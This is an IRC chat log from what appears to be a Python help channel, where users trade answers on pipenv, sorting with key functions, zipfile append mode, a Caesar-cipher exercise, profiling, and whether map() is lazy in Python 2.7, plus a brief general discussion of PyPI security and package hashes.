[15:35:18] *** Joins: enriq (~pitagoras@190.104.249.158)
[15:35:25] *** Joins: skibo (~doblinder@pc-16-125-215-201.cm.vtr.net)
[15:35:49] *** Quits: skibo (~doblinder@pc-16-125-215-201.cm.vtr.net) (Client Quit)
[15:36:35] *** Quits: joebobjoe (~joebobjoe@unaffiliated/joebobjoe) (Ping timeout: 265 seconds)
[15:36:35] *** Quits: akkadian (~akkadian@unaffiliated/akkadian) (Ping timeout: 265 seconds)
[15:36:50] *** Joins: Spacey1 (~Thunderbi@x5ce32845.dyn.telefonica.de)
[15:37:03] *** Joins: backnforth (~backnfort@mctnnbsa45w-156-34-60-65.dhcp-dynamic.fibreop.nb.bellaliant.net)
[15:37:27] *** Quits: Spacey (~Thunderbi@x5ce32845.dyn.telefonica.de) (Ping timeout: 240 seconds)
[15:37:28] *** Spacey1 is now known as Spacey
[15:38:34] *** Quits: kaffeetrauma (~Thunderbi@p200300CF33CBCD00EA2AEAFFFE805F93.dip0.t-ipconnect.de) (Remote host closed the connection)
[15:38:50] *** Quits: stardust85 (~ms580j@144.160.226.95) (Read error: Connection reset by peer)
[15:39:11] *** Joins: ThiefMaster (thief@indico/developer/thiefmaster)
[15:39:48] *** Joins: PulseAsio (~PulseAsio@dhcp-077-248-071-126.chello.nl)
[15:39:54] *** Quits: EchoPapa (~EchoPapa@88.128.81.19) (Read error: Connection reset by peer)
[15:39:54] *** Quits: omarek (~mareko@185.59.108.236.maxnet.net.pl) (Quit: Lost terminal)
[15:40:04] *** Joins: thevishy (~thevishy@111.93.187.34)
[15:40:07] *** Quits: Leeds (~Leeds@223.16.213.143) (Quit: Leaving)
[15:40:14] *** Joins: cagomez (~cagomez@sb0-cf9a61b1.dsl.impulse.net)
[15:40:44] *** dfee4 is now known as dfee
[15:40:49] *** Joins: p0s1x (~p0s1x@dslb-084-059-178-219.084.059.pools.vodafone-ip.de)
[15:41:38] *** Quits: p0s1x (~p0s1x@dslb-084-059-178-219.084.059.pools.vodafone-ip.de) (Client Quit)
[15:41:52] *** Joins: baloona (~baloona@2a02:8070:4c0:cf00:6207:5470:a373:dda8)
[15:42:35] *** Joins: xliiv (~xliiv@d89-122.icpnet.pl)
[15:43:17] *** Joins: nels (~nelsnelso@72.3.161.23)
[15:43:20] *** Joins: laerus (~laerus@185.73.41.1)
[15:44:07] <rodskagg> process= subprocess.Popen(["ls","/tmp"], stdout=subprocess.PIPE, universal_newlines=True)
[15:44:10] <rodskagg> out, err = process.communicate()
[15:44:13] <rodskagg> for line in out.splitlines():
[15:44:13] <laerus> hello, was it on purpose that `from.import whatever` works without spaces around the dot?
[15:44:14] <rodskagg> that works. :)
[15:44:28] <hogarius> tos9:
[15:44:32] *** Quits: RickDeckard (~tgburrin@152.179.78.138) (Ping timeout: 256 seconds)
[15:44:33] *** Quits: nelsnelson (~nelsnelso@rrcs-71-42-191-12.sw.biz.rr.com) (Ping timeout: 248 seconds)
[15:44:45] <rodskagg> thanks Yhg1s
[15:45:24] <LyndsySimon> Let's say I'm using pipenv, and I have a Pipfile that requires Python 3.5.2. Can pipenv install that version if it's not already in place on my system, or do I have to make a separate call to (for instance) pyenv?
[15:46:07] <ChrisWarrick> rodskagg: os.listdir('/tmp') works even better.
[15:46:09] *** Joins: light2yellow (~l2y@185.220.70.149)
[15:46:30] <laerus> LyndsySimon, pipenv doesn't deal with Python versions
[15:46:34] *** Quits: pathrocle (~pathrocle@ldap.nchadvisors.ro) (Read error: Connection reset by peer)
[15:46:46] *** Joins: RickDeckard (~tgburrin@108.60.152.194)
[15:46:51] *** Joins: r29v (~textual@104.220.154.222)
[15:46:56] <offby1> I'm surprised I can't answer this myself, but: when should I explicitly make "None" the default value for a kwarg?  This is a style question, not a syntax or how-the-language-works question
[15:46:59] <LyndsySimon> laerus: It might not install or manage them, but it does verify that the version being used matches the Pipefile.
[15:47:09] <LyndsySimon> Pipfile* (autcorrect)
[15:47:20] *** Quits: Ergo (~ergo@91.238.59.144) (Ping timeout: 260 seconds)
[15:47:27] <offby1> I'm reviewing a co-worker's code, and I want to tell him "Don't use None as the default value for a kwarg, except in these circumstances"; but I can't think of _which_ circumstances
[15:47:28] <Yhg1s> laerus: yes, it's on purpose that that works.
[15:47:36] <laerus> LyndsySimon, yea but you can't use the same Pipfile with different python version. it's not supported yet, just remove the specific python version dependency
[15:47:41] <han-solo> ls is not meant to be parsed in scripts/programs anyway
[15:47:45] <Yhg1s> laerus: just like 'print+1' worked in Python 2.
[15:47:46] <laerus> Yhg1s, oh i had now idea
[15:47:53] <laerus> no*
[15:47:57] *** Joins: csotelo (~csotelo@179.43.97.56)
[15:48:07] <laerus> it's odd
[15:48:11] <Yhg1s> laerus: it's the same thing as 'from . import whatever'
[15:48:17] *** Quits: Haudegen (~quassel@212-186-77-29.static.upcbusiness.at) (Remote host closed the connection)
[15:48:19] *** Quits: Lily-Ayta (~Lily-Ayta@gateway/tor-sasl/lily-ayta) (Remote host closed the connection)
[15:48:19] <LyndsySimon> laerus: Yeah, I get that. I'm trying to write onboarding docs and I'd like to not have to hardcode the Python version in the README if possible.
[15:48:22] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[15:48:31] *** Quits: aielima_ (~aielima@gateway/tor-sasl/aielima) (Remote host closed the connection)
[15:48:37] *** Joins: Ergo (~ergo@91.238.59.144)
[15:48:52] *** Joins: Lily-Ayta (~Lily-Ayta@gateway/tor-sasl/lily-ayta)
[15:49:06] <ChrisWarrick> LyndsySimon: the solution is simple: don’t bother with pipenv
[15:49:19] *** Quits: Tichodroma (~lutz@fsf/member/Tichodroma) (Ping timeout: 256 seconds)
[15:49:26] <LyndsySimon> ChrisWarrick: I'm using pipenv.
[15:49:39] <LyndsySimon> For that matter, not using it makes this more complex, not less.
[15:50:12] *** Joins: Samian (~s@63.230.123.212)
[15:50:13] <Samian> Hi
[15:50:17] <ChrisWarrick> LyndsySimon: no, it does not
[15:50:21] *** Joins: rory (~rory@vega.rory.sh)
[15:50:27] * LyndsySimon sighs
[15:50:28] <Samian> In jupyter notebook, is there a way to save files shown in the directory tree?
[15:50:31] <ChrisWarrick> LyndsySimon: pip + virtualenv is simple.
[15:50:45] <rory> How can I sort a list of strings by the number of "z" characters in each?
[15:51:05] *** Joins: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl)
[15:51:05] *** Quits: amz31 (~amz3@fsfe/amz3) (Ping timeout: 240 seconds)
[15:51:11] <rory> ie: ["zzz", "zz", "zorro"] -> ["zorro", "zz", "zzz"]
[15:51:18] <Yhg1s> rory: write a function that returns the number of 'z' characters in a string, then use that as the 'key' argument to list.sort().
[15:51:27] *** Quits: zefferno (~zefferno@unaffiliated/zefferno) (Quit: Leaving)
[15:51:30] <rory> can it be done in one go?
[15:51:33] <LyndsySimon> ChrisWarrick: Respectfully, thank you for the response, but I'm not interested in having this discussion. I fully understand both the ecosystem and Python packaging and deployment. This is the right solution, I'm just trying to streamline my documentation.
[15:51:39] <rory> or must the helper function be defined?
[15:51:47] *** Joins: zefferno (~zefferno@unaffiliated/zefferno)
[15:51:54] <han-solo> sorted(list_, key=lambda x : x.count('z')) ?
[15:52:15] <Yhg1s> rory: well, you need to have a function that counts 'z's.
[15:53:14] *** Quits: AnySomebody (~AnySomebo@p2003005F2814A396A097A2FFFE5553BE.dip0.t-ipconnect.de) (Ping timeout: 255 seconds)
[15:54:14] <rory> works with lambda x very nice
[15:54:15] <thevishy> yes you need a helper function
[15:54:17] *** Quits: ThiefMaster (thief@indico/developer/thiefmaster) (Ping timeout: 276 seconds)
[15:54:17] <rory> thanks all
[15:54:18] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[15:54:22] *** Joins: ali1234 (~ali1234@88.97.12.44)
[15:54:29] *** Joins: tty01 (186996e2@gateway/web/cgi-irc/kiwiirc.com/ip.24.105.150.226)
[15:55:34] *** Joins: Beanzilla (~Beanzilla@unaffiliated/beanzilla)
[15:56:47] *** Quits: Forsythe (Forsythe@gateway/vpn/privateinternetaccess/forsythe) (Ping timeout: 276 seconds)
[15:56:48] *** Joins: luvjoey (~luvjoey@61.141.72.5)
[15:57:17] <k_sze> Has the cheese shop ever been hacked? I don't mean the typosquatting that was making rounds in the community a few months ago. I mean "hacked" hacked.
[15:57:49] *** Quits: Spacey (~Thunderbi@x5ce32845.dyn.telefonica.de) (Ping timeout: 256 seconds)
[15:57:51] <Yhg1s> k_sze: I'm not sure what '"hacked" hacked' means, but I don't believe so.
[15:58:00] <han-solo> cheese shop ?
[15:58:13] <k_sze> han-solo: cheese shop = pypi.org
[15:58:20] <han-solo> Oh, Okay
[15:58:34] *** Joins: motaka2 (~Thunderbi@160.128.79.188.dynamic.jazztel.es)
[15:58:35] *** Quits: luvjoey (~luvjoey@61.141.72.5) (Client Quit)
[15:58:53] <LordRyan> Yhg1s: had a proper vulnerability other than someone taking a name like "pipi" or "pypy"
[15:58:54] *** Joins: [itchyjunk] (~itchyjunk@unaffiliated/itchyjunk/x-1640057)
[15:58:57] <LordRyan> k_sze: not that I know of
[15:59:17] <LordRyan> i have a friend who would rant for *days* if it were
[16:00:12] *** Joins: luvjoey (~luvjoey@61.141.72.5)
[16:00:34] *** Joins: horohoro (~Zeratul@36.224.118.33)
[16:01:04] *** Quits: horohoro (~Zeratul@36.224.118.33) (Max SendQ exceeded)
[16:01:49] *** Joins: Volis (uid12493@gateway/web/irccloud.com/x-vqdfxyohfaavappw)
[16:01:49] <k_sze> I'm just writing a slide deck to evangelise about Pipenv and the importance to have cryptographic hashes of packages. (I know pip can do it too, but pipenv makes it super easy and on by default.)
[16:01:55] *** Quits: _feuillemorte (irc@nat/redhat/x-zmttqnurvjponyoc) (Ping timeout: 260 seconds)
[16:02:02] <k_sze> Pypi having been hacked would be a great reason, :P
[16:02:25] <LordRyan> perhaps don't look at pypi, but rather at individual packages
[16:02:27] <altendky> k_sze: have they fixed it so you can store the lockfile and use on both windows and linux (and osx...)?
[16:03:05] <LordRyan> it's more likely that someone gains access to a publisher's account and repushes the same release with malware
[16:03:21] *** Quits: MilkmanDan (~dan@wilug/expat/MilkmanDan) (Ping timeout: 264 seconds)
[16:03:28] <httperr418> so Yhg1s any other thought on why my archives are getting overwritten instead of appended to?
[16:03:46] <altendky> LordRyan: you can't update an existing 'file' on pypi
[16:03:47] <k_sze> LordRyan: but dude-x said you can't push the same release on pypi.org. Not sure how much truth there is to that statement.
[16:03:49] *** Quits: newpy (~ops2@lsvl-pf.massivenetworks.net) (Quit: Going offline, see ya! (www.adiirc.com))
[16:04:01] <LordRyan> maybe i'm thinking something else then
[16:04:10] <deepy> k_sze: I've had no success pushing a release a second time
[16:04:18] <LordRyan> problem with using like 10 different programming languages at owrk
[16:04:21] <deepy> greatly annoying when nothing but the meta-data was wrong
[16:04:28] *** Quits: darkhanb (~darkhanb@ip68-224-95-5.lv.lv.cox.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:04:30] <laerus> yea you can't push the same release on pypi, got burned some times by that
[16:04:33] <ChrisWarrick> pushing a new one might still be problematic
[16:04:47] * luvjoey 
[16:04:48] * luvjoey 晕倒
[16:04:48] *** Parts: luvjoey (~luvjoey@61.141.72.5) ("WeeChat 1.9.1")
[16:04:49] <jayjo_> I have a pandas dataframe (or dict) - is it possible to get it into json/dict like {index: [{col1: val}, ...], ...} or better yet labeled like {index: [{'x': col1, 'y': val}, ...], ... }. I have a bpaste here with real data to show the issue: https://bpaste.net/show/bbf879811ac1
[16:04:56] <LordRyan> perhaps but you don't need a hash for that - just a pinned version
[16:05:06] *** Joins: MilkmanDan (~dan@wilug/expat/MilkmanDan)
[16:05:09] *** Quits: bablux (~bablux@gateway/tor-sasl/cyril1) (Ping timeout: 250 seconds)
[16:05:09] *** Quits: thevishy (~thevishy@111.93.187.34) (Quit: thevishy)
[16:05:22] <ChrisWarrick> hashes won't help on pypi with security much
[16:05:28] *** Joins: ThiefMaster (thief@indico/developer/thiefmaster)
[16:05:37] <ChrisWarrick> they would only help in case of a mitm problem, but then you’ve got bigger problems anyways
[16:05:53] <deepy> Wouldn't TLS help more?
[16:06:23] <LordRyan> not really
[16:06:33] <LordRyan> CAs are pretty bad sometimes
[16:06:51] <laerus> LordRyan, a pinned version tells nothing about if the source was changed
[16:06:53] *** Quits: notzmv (~zmv@189.110.147.41) (Read error: Connection reset by peer)
[16:06:55] *** Joins: amirpro (~amirpro@41.235.244.66)
[16:06:58] *** Quits: djb-irc (~djb-irc@129.13.154.138) (Quit: Leaving)
[16:07:02] *** Quits: sol1x (~sol1x@2a02:810d:4ac0:546a:226d:6d32:8be3:9c2a) (Ping timeout: 265 seconds)
[16:07:11] <k_sze> So what are hashes for? The pip documentation specifically says that the hashes are for protection against remote tampering (https://pip.pypa.io/en/stable/reference/pip_install/#hash-checking-mode)
[16:07:12] <altendky> isn't the hash just about 'you have what you had before'?  there are other features where pipenv checks with some security db
[16:07:14] *** Joins: notzmv (~zmv@189.110.147.41)
[16:07:29] <LordRyan> laerus: right, which is why you need a hash, or to trust that the server doesn't change it
[16:07:45] <LordRyan> and trust is a lie
[16:07:50] <LordRyan> so don't ever trust, always use a hash
[16:07:56] *** Joins: skibo (~skibo@192.241.150.57)
[16:08:04] <laerus> k_sze, hashes are for validation
[16:08:29] <k_sze> laerus: that your download is not *corrupted* by accident?
[16:08:39] *** Joins: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2)
[16:08:57] <jayjo_> I'm really trying to convert my data from dicts/json in a pandas dataframe to object notation for js with labeled fields
[16:09:05] *** Joins: L00P3X (~L00P3X@gateway/tor-sasl/l00p3x)
[16:09:13] *** Joins: jarthur (~jarthur@207.114.244.5)
[16:09:17] <laerus> k_sze, and that your dependency is in the state you actually started with
[16:09:40] *** Joins: DrBrownBear (~DrBrownbe@96.44.147.42)
[16:09:47] *** Quits: skibo (~skibo@192.241.150.57) (Client Quit)
[16:10:02] *** Joins: skibo (~skibo@192.241.150.57)
[16:10:05] *** Quits: lumm (~lumm@221.41.136.77.rev.sfr.net) (Quit: lumm)
[16:10:08] <httperr418> perhaps someone else can suggest an answer to my problem
[16:10:13] *** Joins: nixjdm (~nixjdm@2605:a601:1135:a400:54aa:e522:68c8:8482)
[16:10:14] <httperr418> I'm opening with zipfile.Zipfile(path, 'a', zipfile.ZIP_DEFLATED) in order to add new files to an existing archive
[16:10:14] *** Joins: rpg (~rpg@sift.net)
[16:10:19] <httperr418> but what I'm actually finding is that it overwrites the existing archive
[16:10:38] *** Joins: basen_ (~basen_@62-178-248-26.cable.dynamic.surfer.at)
[16:11:23] <ChrisWarrick> httperr418: what do you expect to happen instead?
[16:11:26] <han-solo> jayjo_: http://ix.io/1fKI # this work ?
[16:12:06] <han-solo> nope
[16:12:25] <han-solo> or i don't know. I'm gonna shut up
[16:12:29] *** Quits: sdwrage (~textual@64.247.67.53) (Ping timeout: 276 seconds)
[16:12:44] *** Quits: skibo (~skibo@192.241.150.57) (Client Quit)
[16:12:54] *** Joins: rpkilby (~rpkilby@152.7.255.195)
[16:13:24] <laerus> han-solo, also take a loot at `collections.defaultdict` in case this is useful
[16:13:49] *** Joins: skibo (~skibo@192.241.150.57)
[16:14:04] <jayjo_> that does look to get the first case - let me see if I can get it to label x/y
[16:14:25] <han-solo> jayjo_: use the namedtuples jayjo_ :)
[16:14:35] <httperr418> ChrisWarrick: I expected it to append to the archive so that the existing files would still be there but new ones would be added on top
[16:15:09] *** Joins: aalmazan (uid180785@gateway/web/irccloud.com/x-pjlxcbsxahiccclu)
[16:15:34] <httperr418> however after the second time I open and write, it only has files from the second open/write, everything from the first is gone
[16:16:40] <han-solo> laerus: Okay
[16:16:54] *** Quits: laerus (~laerus@185.73.41.1) (Remote host closed the connection)
[16:17:20] *** Joins: nibble_zero (~nibble_ze@37.244.231.177)
[16:17:40] *** Quits: DeaDSouL (~DeaDSouL@45.123.117.4) (Quit: leaving)
[16:17:49] *** Joins: methyl (~methyl@unaffiliated/methyl)
[16:17:50] *** Quits: methyl (~methyl@unaffiliated/methyl) (Max SendQ exceeded)
[16:18:13] *** Quits: rpkilby (~rpkilby@152.7.255.195) (Remote host closed the connection)
[16:18:14] *** Joins: methyl (~methyl@unaffiliated/methyl)
[16:18:15] *** Quits: methyl (~methyl@unaffiliated/methyl) (Max SendQ exceeded)
[16:18:39] *** Joins: methyl (~methyl@unaffiliated/methyl)
[16:19:31] *** Joins: super_cool_guest (~Thunderbi@251.86.119.78.rev.sfr.net)
[16:20:30] *** Quits: k_sze (~Kira@unaffiliated/kira) ()
[16:20:46] *** Joins: purplex88_ (~purplex88@unaffiliated/purplex88)
[16:20:58] *** Joins: EchoPapa (~EchoPapa@p5498CC83.dip0.t-ipconnect.de)
[16:20:58] *** Joins: rafael_p (uid72318@gateway/web/irccloud.com/x-ubolikzeygzhwulk)
[16:21:22] *** Quits: purplex88 (~purplex88@unaffiliated/purplex88) (Ping timeout: 264 seconds)
[16:21:31] *** purplex88_ is now known as purplex88
[16:21:37] <LyndsySimon> FYI: pipenv *does* manage installed pythons via pyenv, if pyenv is installed and shims are in place.
[16:21:40] *** Quits: njbair (~njbair@cpe-104-231-109-72.neo.res.rr.com) (Excess Flood)
[16:22:10] *** Joins: njbair (~njbair@2605:a000:122d:c254:227:eff:fe0a:b289)
[16:23:21] *** Joins: mschuene (~maikschue@dslb-188-096-183-061.188.096.pools.vodafone-ip.de)
[16:23:30] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[16:24:28] *** Parts: mschuene (~maikschue@dslb-188-096-183-061.188.096.pools.vodafone-ip.de) ()
[16:25:06] *** Quits: Miroboru (~myrvoll@133.58.244.158) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:26:16] <WhileTrue> hello back everyone :) I am making a mistake in line 9 but couldnt figure why it shouldnt be not correct: https://paste.debian.net/1031728/
[16:26:23] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Client Quit)
[16:26:24] <WhileTrue> should*
[16:26:27] <anddam> the last elif: at https://gist.github.com/adab4d/d2b7ea0e11d08341079eeb15022cd49a is just an else: given the previous conditions, right?
[16:26:52] <anddam> I think so but I'm a bit mentally tired atm
[16:27:08] <zalt> is it normal for a datastructure of 300k words to take 4 seconds to initialize? :P
[16:27:26] <WhileTrue> (I could have replaced ibm)
[16:28:15] <altendky> anddam: i think so.  unless someone has some goofy classes maybe.
[16:28:25] <anddam> WhileTrue: likely the wrong part there is that you have i=0 and then a while
[16:28:38] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 276 seconds)
[16:29:22] <altendky> WhileTrue: why not `for character in word:`?
[16:29:26] <WhileTrue> anddam, I dont see why..until line 9 all seems ok, the new "j" values are generated
[16:29:26] *** Quits: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl) (Ping timeout: 256 seconds)
[16:29:59] <WhileTrue> only that the new "word" doesnt emerge
[16:30:00] <anddam> WhileTrue: well, about your specific question you didn't show any actual error message
[16:30:09] <zalt> are there good profiling tools for python?
[16:30:19] <altendky> zalt: i've used cProfile+snakeviz
[16:30:23] <anddam> what I was saying is that Hettinger's talks are very against this
[16:30:26] *** Quits: NomadJim (~NomadJim@pdpc/supporter/active/nomadjim) (Ping timeout: 256 seconds)
[16:30:28] <WhileTrue> anddam, there is not particular error, but the output word is the same as the input word
[16:30:41] <LordRyan> zalt: cProfile?
[16:30:44] *** Joins: darkhanb (~darkhanb@ip24-253-111-229.lv.lv.cox.net)
[16:30:58] <anddam> WhileTrue: unsurprising since you're not altering word in any way, you have a comparison == there
[16:31:07] <altendky> WhileTrue: it looks like you are rotating characters through the alphabet, not rotating the word?  abcd -> bcda or somesuch, yes?
[16:31:10] <zalt> hmm, it seems cool
[16:31:19] <anddam> WhileTrue: also use proper spacing   word[i] == chr(j)
[16:31:51] <anddam> altendky: I'm not even sure why I asked the thing in first place, seems straightforward. but my pyspider senses are tingling
[16:32:10] <altendky> anddam: fair enough, it seems convoluted enough that it ought to have a purpose...  but
[16:32:25] *** Quits: sz0 (uid110435@gateway/web/irccloud.com/x-bqubnrgbjllswenv) (Quit: Connection closed for inactivity)
[16:32:36] <anddam> altendky: just to be clear we're talking about my gist, right?
[16:32:40] <han-solo> word[i] == chr(j) or word[i] = chr(j) ?
[16:32:46] <altendky> anddam: yes
[16:33:17] <altendky> WhileTrue: build a new rotated_word, don't try to mutate the existing word.  you can't since strings are immutable (assuming word is a string).
[16:33:31] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:33:39] <altendky> WhileTrue: but, rotating characters like abcd -> bcda has nothing to do with ord()
[16:33:57] *** Joins: mefistofeles (~mefistofe@unaffiliated/mefistofeles)
[16:34:02] <anddam> altendky: I'm parsing a CSV, from its rows I build an Order instance called order, then I want to route this instance in one of three different lists
[16:34:03] <WhileTrue> altendky, rotating the letters, yes, the so-called caesar cypher
[16:34:04] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[16:34:10] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Max SendQ exceeded)
[16:34:24] <WhileTrue> anddam, yes, that's the part I couldnt solve
[16:34:36] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:34:55] <WhileTrue> han-solo, with a single "=" I get error
[16:35:05] <han-solo> Yeah, because strings are immutable
[16:35:07] *** Joins: dxiri (~dxiri@2001:4878:8129:102:100::9e)
[16:35:08] <altendky> 12:33 <altendky> WhileTrue: build a new rotated_word, don't try to mutate the existing word.  you can't since strings are immutable (assuming word is a string).
[16:35:12] *** Quits: zefferno (~zefferno@unaffiliated/zefferno) (Ping timeout: 245 seconds)
[16:35:31] <zalt> looks like i found the culprit: 370099    3.180    0.000    7.311    0.000 trie.py:71(add_str)
[16:35:40] *** Quits: tty14 (~azuri5@14.143.147.182) (Remote host closed the connection)
[16:35:53] <altendky> WhileTrue: even if you did mutate, such as with a list of characters, you'd need a temporary place to hold some character.
[16:36:00] *** Joins: Spacey (~Thunderbi@89.27.166.62)
[16:36:26] <zalt> i kind of intentionally written it to be as slow as possible just to what difference trying to optimize it would make :P
[16:36:48] *** Quits: ThiefMaster (thief@indico/developer/thiefmaster) (Ping timeout: 256 seconds)
[16:36:57] *** Quits: kurkale6ka (~kurkale6k@84.45.99.125) (Ping timeout: 264 seconds)
[16:37:07] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Max SendQ exceeded)
[16:37:11] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 276 seconds)
[16:37:14] <altendky> zalt: are you 'appending' to a string a bunch of times?
[16:37:26] *** Quits: Atque (~Atque@unaffiliated/atque) (Quit: ...)
[16:37:38] *** Quits: enriq (~pitagoras@190.104.249.158) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:37:48] <WhileTrue> altendky, yes, it is a string, ord() helps to transpose the letters into their numeric values so that they can be rotated
[16:37:53] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:37:58] <zalt> nah, even worse, reaching nodes of a trie tree starting each time from the root :P
[16:38:01] *** Quits: Fulgen_ (~Fulgen@078132058052.public.t-mobile.at) (Quit: Leaving)
[16:38:11] <altendky> WhileTrue: why do you need that?  the characters aren't supposed to be changed, just shifted
[16:38:11] <WhileTrue> also it is recommended to be used by the author of the question
[16:38:37] <zalt> in a linked list style tree, (so don't even think about cache :P)
[16:38:37] <altendky> WhileTrue: or, maybe the assignment comment is poorly written
[16:38:40] *** Quits: Spacey (~Thunderbi@89.27.166.62) (Client Quit)
[16:38:41] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 255 seconds)
[16:38:42] <WhileTrue> it is not known to me how I can shift a letter n places without using a numerical reference to it
[16:39:04] <altendky> WhileTrue: "returns a new string that contains the letters from the original"  i read that as whatever letters are in the original should also be in the result.
[16:39:04] <anddam> WhileTrue: that's the beauty of learning new stuff
[16:39:08] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Max SendQ exceeded)
[16:39:19] <bjs> WhileTrue: does the question have some examples of rotated strings?
[16:39:25] <altendky> WhileTrue: can you give an example of what you think a correct input/output would be?
[16:39:41] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:39:42] <altendky> WhileTrue: i've said many times abcd -> bcda which does not involve ord at all
[16:39:56] *** Parts: akk (~akkana@75.161.148.9) ("+++")
[16:40:06] <WhileTrue> altendky, but the sentence continues with "rotated by the given amount"
[16:40:09] <altendky> WhileTrue: or perhaps a more clear example lkde -> elkd
[16:40:16] <altendky> WhileTrue: sure, rotating in what 'dimension'?
[16:40:25] <bjs> altendky: I think you and WhileTrue have different ideas of what rotate means here
[16:40:35] <altendky> bjs: hence my writing examples and asking for theirs
[16:40:41] <WhileTrue> bjs, for ex. IBM > HAL
[16:40:49] <WhileTrue> rotated by -1
[16:41:09] <WhileTrue> (Space Odyssey)
[16:41:20] *** Joins: tjt263 (uid149471@gateway/web/irccloud.com/x-gdyhfwzsuorptvxp)
[16:41:33] <WhileTrue> the author says: "To rotate a word, rotate each letter by the same amount. For example, “cheer” rotated by 7 is “jolly” and “melon” rotated by -10 is “cubed”. In the movie 2001: A Space Odyssey, the ship computer is called HAL, which is IBM rotated by -1."
[16:41:33] <bjs> WhileTrue: that's one way of interpreting the phrase "rotated by -1", "IBM" -> "MBI" is another
[16:41:39] <bjs> MIB*
[16:42:05] *** Quits: purplex88 (~purplex88@unaffiliated/purplex88) (Ping timeout: 240 seconds)
[16:42:20] *** Quits: Syzygy (~Syzygy@2001:850:40bc:8000:94c8:3232:f35e:1ba8) (Ping timeout: 245 seconds)
[16:42:21] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Max SendQ exceeded)
[16:42:23] <bjs> WhileTrue: okay then! (why didn't you include that in your original paste)
[16:42:38] *** Joins: ibiam (~ibiam@105.112.89.154)
[16:42:43] <bjs> WhileTrue: one way to do this is to build a new string, a character at a time, and return it
[16:42:44] *** Joins: Haudegen (~quassel@178.115.237.87)
[16:42:45] *** Joins: alicefreak (75c753cf@gateway/web/freenode/ip.117.199.83.207)
[16:42:52] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:43:11] <WhileTrue> bjs, sorry, I didnt think the question would be blurry
[16:43:30] *** Joins: purplex88 (~purplex88@unaffiliated/purplex88)
[16:43:42] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[16:43:45] <altendky> WhileTrue: that's why i gave an example when i thought it was
[16:44:06] <altendky> WhileTrue: but regardless, we often default to building a new thing over mutating the original.
[16:44:07] *** Joins: catbusters (uid40652@gateway/web/irccloud.com/x-qxoslrwrqgcdaqmd)
[16:44:22] <WhileTrue> altendky, sorry, I missed it while I was replying
[16:44:24] <altendky> WhileTrue: for that, sure, use ord, or build a dict for simpler wrapping at the ends.  i'd do the latter i suppose.
[16:44:43] *** Joins: nelsnelson (~nelsnelso@rrcs-71-42-191-12.sw.biz.rr.com)
[16:44:55] <altendky> curiously, building the dict uses the interpretation of 'rotate' that i made for the original problem :]
[16:45:27] *** Quits: nels (~nelsnelso@72.3.161.23) (Ping timeout: 240 seconds)
[16:45:30] *** Quits: foxmask (uid302052@gateway/web/irccloud.com/x-tbwkttvzdhjnklxq) (Quit: Connection closed for inactivity)
[16:45:31] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Max SendQ exceeded)
[16:45:40] *** Joins: root3d (~root3d@unaffiliated/root3d)
[16:45:47] *** Joins: SkyLeach (~skyleach@2001:420:c0c4:1008::2a7)
[16:46:01] <SkyLeach> hey guys, a map() function returns a generator right?
[16:46:03] *** Joins: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9)
[16:46:39] <altendky> SkyLeach: https://docs.python.org/3/library/functions.html#map (might be different in 2)
[16:46:40] <Wooble> SkyLeach: no, it returns a map object.
[16:46:44] <SkyLeach> so if I do map(lambda x: func(x), mylist) I'm just going to get back a map_gen right?
[16:46:49] *** Joins: ThiefMaster (~thief@indico/developer/thiefmaster)
[16:46:53] <SkyLeach> yeah this is 2.7
[16:47:23] <Wooble> SkyLeach: in 2.7 you get a list.
[16:47:24] <alicefreak> Hi guys, I'm tring to execute specific test using PyCharm. But I'm getting an error "No Module named StroageTests". I couldn't figure it out. Can you please take a look? Here is my code and traceback. https://pastebin.com/mNctVhVT . Thanks a lot.
[16:47:26] <infobob> https://paste.pound-python.org/show/CIhYvx9MyX4etIG97OpD/ (repasted for alicefreak)
[16:47:27] <altendky> SkyLeach: "Apply function to every item of iterable and return a list of the results"  https://docs.python.org/2/library/functions.html#map
[16:47:35] <SkyLeach> ok let me clarify
[16:47:45] *** Joins: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it)
[16:48:05] <SkyLeach> I realize that the returned object is a map object, but for all practical purposes it hasn't iterated the list or applied the function until it is consumed just like what happens with a generator, right?
[16:48:16] <altendky> SkyLeach: did you read the py2 docs?
[16:48:17] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[16:48:20] <SkyLeach> yes
[16:48:23] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Max SendQ exceeded)
[16:48:26] <Wooble> SkyLeach: in 2.7, it's not lazy at all. You get a list.
[16:48:35] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 255 seconds)
[16:48:38] <altendky> SkyLeach: what part of 'return a list of the results' says 'map object' or 'generator'?
